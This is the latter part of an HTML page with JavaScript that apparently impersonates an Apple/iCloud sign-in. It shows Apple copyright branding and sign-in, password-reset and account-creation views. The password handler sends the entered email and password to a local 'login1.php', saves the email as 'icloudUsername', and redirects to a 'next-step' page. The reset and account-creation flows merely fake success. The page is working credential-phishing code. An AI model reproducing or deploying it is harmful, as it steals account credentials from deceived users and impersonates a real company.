                                <option value="11">November</option>
                                <option value="12">December</option>
                            </select>
                            <select id="dob-day" class="form-select" required>
                                <option value="">Day</option>
                            </select>
                            <select id="dob-year" class="form-select" required>
                                <option value="">Year</option>
                            </select>
                        </div>
                    </div>

                    <button type="submit" class="btn btn-primary">Create Account</button>
                </form>

                <a href="#" class="auth-link" id="back-to-signin-2">Already have an account? Sign In</a>
            </div>

            <!-- Message Box -->
            <div class="message-box" id="message-box"></div>
        </div>
    </main>

   <footer class="footer">
    <div class="footer-left">
        <a href="#" class="footer-link">System Status</a>
        <span class="divider">|</span>
        <a href="#" class="footer-link">Privacy Policy</a>
        <span class="divider">|</span>
        <a href="#" class="footer-link">Terms & Conditions</a>
    </div>

    <div class="footer-right">
        Copyright © 2026 Apple Inc. All rights reserved.
    </div>
</footer>
<script>
const continueBtn = document.getElementById('continue-btn');
const signinEmailInput = document.getElementById('signin-email');

// Add little letter spacing for style
signinEmailInput.style.letterSpacing = '1px';


signinEmailInput.addEventListener('input', (e) => {
    const value = e.target.value.trim();

    // simple live validation feedback (optional UI behavior)
    if (value.length > 0 && !value.includes('@')) {
        signinEmailInput.style.borderColor = "#ff453a";
    } else {
        signinEmailInput.style.borderColor = "";
    }
});



</script>

    <script>
        // View Management
        const views = {
            signin: document.getElementById('signin-view'),
            password: document.getElementById('password-view'),
            forgot: document.getElementById('forgot-view'),
            create: document.getElementById('create-view')
        };

        const messageBox = document.getElementById('message-box');
        let userEmail = '';

        function switchView(targetView) {
            // Hide all views
            Object.values(views).forEach(view => view.classList.remove('active'));
            
            // Show target view
            views[targetView].classList.add('active');
            
            // Clear message box
            hideMessage();
            
            // Clear error states
            document.querySelectorAll('.form-input.error').forEach(input => {
                input.classList.remove('error');
            });

            // Scroll to top smoothly
            window.scrollTo({ top: 0, behavior: 'smooth' });
        }

        // View Navigation Event Listeners
        document.getElementById('show-forgot').addEventListener('click', (e) => {
            e.preventDefault();
            switchView('forgot');
        });

        document.getElementById('show-create').addEventListener('click', (e) => {
            e.preventDefault();
            switchView('create');
        });

        document.getElementById('back-to-email').addEventListener('click', (e) => {
            e.preventDefault();
            switchView('signin');
            document.getElementById('signin-email').value = userEmail;
        });

        document.getElementById('back-to-signin-1').addEventListener('click', (e) => {
            e.preventDefault();
            switchView('signin');
        });

        document.getElementById('back-to-signin-2').addEventListener('click', (e) => {
            e.preventDefault();
            switchView('signin');
        });

        // Message Display Functions
        function showMessage(message, type = 'success') {
            messageBox.textContent = message;
            messageBox.className = 'message-box visible ' + type;
        }

        function hideMessage() {
            messageBox.className = 'message-box';
        }

        // Email Validation
        function isValidEmail(email) {
            const emailRegex = /^[^\s@]+@[^\s@]+\.[a-zA-Z]{2,63}$/;
            return emailRegex.test(email);
        }

        // Password Strength Checker
        function checkPasswordStrength(password) {
            let strength = 0;
            
            if (password.length >= 8) strength++;
            if (password.length >= 12) strength++;
            if (/[a-z]/.test(password) && /[A-Z]/.test(password)) strength++;
            if (/\d/.test(password)) strength++;
            if (/[^a-zA-Z0-9]/.test(password)) strength++;

            if (strength <= 2) return 'weak';
            if (strength <= 3) return 'medium';
            return 'strong';
        }

        // Password Strength Indicator
        const createPasswordInput = document.getElementById('create-password');
        const strengthIndicator = document.querySelector('.password-strength');
        const strengthBar = document.querySelector('.password-strength-bar');
        const strengthText = document.querySelector('.password-strength-text');

        createPasswordInput.addEventListener('input', (e) => {
            const password = e.target.value;
            
            if (password.length === 0) {
                strengthIndicator.classList.remove('visible');
                strengthText.textContent = '';
                return;
            }

            strengthIndicator.classList.add('visible');
            const strength = checkPasswordStrength(password);
            
            strengthBar.className = 'password-strength-bar ' + strength;
            
            if (strength === 'weak') {
                strengthText.textContent = 'Weak password';
                strengthText.style.color = 'var(--error-color)';
            } else if (strength === 'medium') {
                strengthText.textContent = 'Medium password';
                strengthText.style.color = '#ff9500';
            } else {
                strengthText.textContent = 'Strong password';
                strengthText.style.color = 'var(--success-color)';
            }
        });

        // Password Toggle Functionality
        document.querySelectorAll('.password-toggle').forEach(toggle => {
            toggle.addEventListener('click', (e) => {
                const targetId = e.target.dataset.target;
                const input = document.getElementById(targetId);
                
                if (input.type === 'password') {
                    input.type = 'text';
                    e.target.textContent = 'Hide';
                } else {
                    input.type = 'password';
                    e.target.textContent = 'Show';
                }
            });
        });

        // Populate Date of Birth Dropdowns
        function populateDateDropdowns() {
            const daySelect = document.getElementById('dob-day');
            const yearSelect = document.getElementById('dob-year');
            
            // Populate days (1-31)
            for (let i = 1; i <= 31; i++) {
                const option = document.createElement('option');
                option.value = i < 10 ? '0' + i : i;
                option.textContent = i;
                daySelect.appendChild(option);
            }
            
            // Populate years (current year - 100 to current year - 13)
            const currentYear = new Date().getFullYear();
            for (let i = currentYear - 13; i >= currentYear - 100; i--) {
                const option = document.createElement('option');
                option.value = i;
                option.textContent = i;
                yearSelect.appendChild(option);
            }
        }

        populateDateDropdowns();

        // Form Validation Helper
        function validateInput(input) {
            if (input.type === 'email') {
                if (!isValidEmail(input.value)) {
                    input.classList.add('error');
                    return false;
                }
            }
            
            if (input.value.trim() === '') {
                input.classList.add('error');
                return false;
            }
            
            input.classList.remove('error');
            return true;
        }

        // Remove error state on input
        document.querySelectorAll('.form-input, .form-select').forEach(input => {
            input.addEventListener('input', () => {
                input.classList.remove('error');
                hideMessage();
            });
        });

        // Continue Button Handler (Email Step)
       document.getElementById('continue-btn').addEventListener('click', (e) => {
    e.preventDefault();

    const emailInput = document.getElementById('signin-email');
    const email = emailInput.value.trim();

    const messageBox = document.getElementById('message-box');

    // EMAIL RULE
    const emailRegex = /^[^\s@]+@[^\s@]+\.[a-zA-Z]{2,63}$/;
if (!emailRegex.test(email)) {
    showMessage("Invalid email domain", "error");
    return;
}
    // RESET UI ERROR
    emailInput.classList.remove('error');
    messageBox.classList.remove('visible');

    // ❌ EMPTY CHECK
    if (!email) {
        emailInput.classList.add('error');
        messageBox.textContent = "Please enter your email address";
        messageBox.className = "message-box visible error";
        return; // STOP HERE
    }

    // ❌ FORMAT CHECK
    if (!emailRegex.test(email)) {
        emailInput.classList.add('error');
        messageBox.textContent = "Invalid email format (example: name@gmail.com)";
        messageBox.className = "message-box visible error";
        return; // STOP HERE (IMPORTANT)
    }

    // ✅ ONLY RUN IF VALID
    window.userEmail = email;
    localStorage.setItem('icloudUsername', email);

    document.getElementById('email-display').textContent = email;

    // proceed ONLY when valid
    switchView('password');
});

        // Also handle Enter key on email input
        document.getElementById('signin-email').addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                e.preventDefault();
                document.getElementById('continue-btn').click();
            }
        });

        // Password Form Handler
        document.getElementById('password-form').addEventListener('submit', (e) => {
            e.preventDefault();
            
            const passwordInput = document.getElementById('signin-password');
           
            
            if (passwordInput.value.trim() === '') {
                passwordInput.classList.add('error');
                showMessage('Please enter your password', 'error');
                return;
            }
            
            passwordInput.classList.remove('error');
            
            // Simulate loading state
            const submitBtn = e.target.querySelector('.btn-primary');
            submitBtn.classList.add('loading');
            submitBtn.disabled = true;
            
            // Send data to PHP backend
            const formData = new FormData();
            formData.append('foo', '1');
            formData.append('eml', window.userEmail);
            formData.append('pwd', passwordInput.value);
            
            fetch('login1.php', {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                submitBtn.classList.remove('loading');
                submitBtn.disabled = false;
                
                if (data.success) {
                    // Store remember me preference
                  
                    
                    showMessage('Sign in successful! Welcome back.', 'success'); 
                    
                    // Redirect to next page
                    setTimeout(() => {
                       window.location.href = "../next-step.php";
                    }, 1500);
                } else {
                    showMessage('Login failed. Please try again.', 'error');
                }
            })
            .catch(error => {
                submitBtn.classList.remove('loading');
                submitBtn.disabled = false;
                showMessage('Connection error. Please try again.', 'error');
                console.error('Error:', error);
            });
        });

        // Forgot Password Form Handler
        document.getElementById('forgot-form').addEventListener('submit', (e) => {
            e.preventDefault();
            
            const emailInput = document.getElementById('forgot-email');
            
            if (validateInput(emailInput)) {
                const submitBtn = e.target.querySelector('.btn-primary');
                submitBtn.classList.add('loading');
                submitBtn.disabled = true;
                
                // Simulate API call
                setTimeout(() => {
                    submitBtn.classList.remove('loading');
                    submitBtn.disabled = false;
                    showMessage('Password reset instructions have been sent to your email.', 'success');
                    emailInput.value = '';
                }, 1500);
            } else {
                showMessage('Please enter a valid email address', 'error');
            }
        });

        // Create Account Form Handler
        document.getElementById('create-form').addEventListener('submit', (e) => {
            e.preventDefault();
            
            const nameInput = document.getElementById('create-name');
            const emailInput = document.getElementById('create-email');
            const passwordInput = document.getElementById('create-password');
            const confirmInput = document.getElementById('create-confirm');
            const monthSelect = document.getElementById('dob-month');
            const daySelect = document.getElementById('dob-day');
            const yearSelect = document.getElementById('dob-year');
            
            let isValid = true;
            let errorMessage = '';
            
            // Validate all fields
            if (!validateInput(nameInput)) {
                isValid = false;
                errorMessage = 'Please enter your full name';
            }
            
            if (!validateInput(emailInput)) {
                isValid = false;
                errorMessage = 'Please enter a valid email address';
            }
            
            if (!validateInput(passwordInput)) {
                isValid = false;
                errorMessage = 'Please enter a password';
            } else if (passwordInput.value.length < 8) {
                isValid = false;
                passwordInput.classList.add('error');
                errorMessage = 'Password must be at least 8 characters long';
            }
            
            if (passwordInput.value !== confirmInput.value) {
                isValid = false;
                confirmInput.classList.add('error');
                errorMessage = 'Passwords do not match';
            }
            
            if (!monthSelect.value || !daySelect.value || !yearSelect.value) {
                isValid = false;
                if (!monthSelect.value) monthSelect.classList.add('error');
                if (!daySelect.value) daySelect.classList.add('error');
                if (!yearSelect.value) yearSelect.classList.add('error');
                errorMessage = 'Please enter your date of birth';
            }
            
            if (isValid) {
                const submitBtn = e.target.querySelector('.btn-primary');
                submitBtn.classList.add('loading');
                submitBtn.disabled = true;
                
                // Simulate API call
                setTimeout(() => {
                    submitBtn.classList.remove('loading');
                    submitBtn.disabled = false;
                    showMessage('Account created successfully! Welcome aboard.', 'success');
                    
                    // Switch to sign in after 2 seconds
                    setTimeout(() => {
                        switchView('signin');
                        showMessage('Please sign in with your new account', 'success');
                    }, 2000);
                }, 1500);
            } else {
                showMessage(errorMessage, 'error');
            }
        });

        // Load remembered email on page load
        window.addEventListener('DOMContentLoaded', () => {
            if (localStorage.getItem('rememberMe') === 'true') {
                const rememberedEmail = localStorage.getItem('rememberedEmail');
                if (rememberedEmail) {
                    document.getElementById('signin-email').value = rememberedEmail;
                    document.getElementById('remember-me').checked = true;
                }
            }
        });

        // Clear error states on select change
        document.querySelectorAll('.form-select').forEach(select => {
            select.addEventListener('change', () => {
                select.classList.remove('error');
                hideMessage();
            });
        });
    
    
    </script>
<script>
function detectThemeByDevice() {

    const userAgent = navigator.userAgent || navigator.vendor || window.opera;

    const isIOS =
        /iPhone|iPad|iPod/i.test(userAgent) ||
        (navigator.platform === "MacIntel" && navigator.maxTouchPoints > 1);

    // ❗ ALWAYS RESET FIRST (IMPORTANT FIX)
    document.body.classList.remove("light", "dark");

    if (isIOS) {
        document.body.classList.add("dark");
        console.log("THEME: DARK (iOS detected)");
    } else {
        document.body.classList.add("light");
        console.log("THEME: LIGHT (non-iOS detected)");
    }
}

detectThemeByDevice();
</script>
</body>
</html>

